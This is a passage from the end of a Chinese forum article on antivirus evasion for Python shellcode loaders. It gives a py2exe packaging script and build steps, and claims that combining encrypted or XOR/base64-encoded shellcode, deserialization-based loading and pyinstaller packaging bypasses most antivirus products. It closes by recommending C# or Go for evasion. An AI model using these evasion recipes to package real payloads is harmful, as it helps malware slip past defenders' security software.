import py2exe  
setup(  
    options\={  
        'py2exe': {  
            'optimize': 2,    
            'compressed': True,  
        },  
    },  
    #console=\[{"script": "test.py", "icon\_resources": \[(1, "test.ico")\]}\],  #显示控制台  
    windows\=\[{"script": "hello.py","icon\_resources": \[(1, "test.ico")}\],   ##不显示控制台  
    zipfile\=None,  
)
```

运行`python2 setup.py py2exe`

然后将dist 子目录下的所有文件复制到目标，运行。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-def07349771400570fa58f95301b23ea31c336dc.png)

> 默认情况下，py2exe 会在 dist 下创建以下这些文件：
> 
> 1、一个或多个 exe 文件； 2、几个 .pyd 文件，它们是已编译的扩展名，是 exe 文件所需要的； 3、python\*\*.dll，加上其它的 .dll 文件，这些 .dll 是 .pyd 所需要的； 4、一个 library.zip 文件，它包含了已编译的纯的 python 模块如 .pyc 或 .pyo；

0x06 组合，免杀效果测试
==============

以上随意选几种方式组合，即可过大部分杀软。例如：

**1、shellcode\_aes + shellcodeloader\_pem + pyinstaller+python3 :**

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-802cab202faabf5c229b2760b9252620ca891be1.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b7f3b55ae0c30d28b8cdd6258b551779367daf10.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-19201ec57a264b400cb30371a33e9291778f11bf.png)

**2、随机变量名+shellcode\_xor\_base64 + 反序列化 + pyinstaller+python3 :**

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b49bd1a81e86b6115d4aa7d256303ca7d7f9a77e.png)

0x07 小节
=======

免杀的方式多种多样，这只是免杀技术的冰山一角角。

本文我们测试了python常见的一些免杀方法，篇幅问题，没有还有一些没有展示，比如使用一些新的winapi（AllocADsMem、ReallocADsMem等等）、其他的分离方法、加载内存方法...

我们可以看出，虽然最后的查杀率还可以，但是生成的文件太大了，也有一些杀软把用py2exe、pyinstaller生成的任何exe包都当作了恶意文件，因此在实际中，还是更推荐用C#、go这种语言来写免杀。当然，方法都类似，只是语言不同。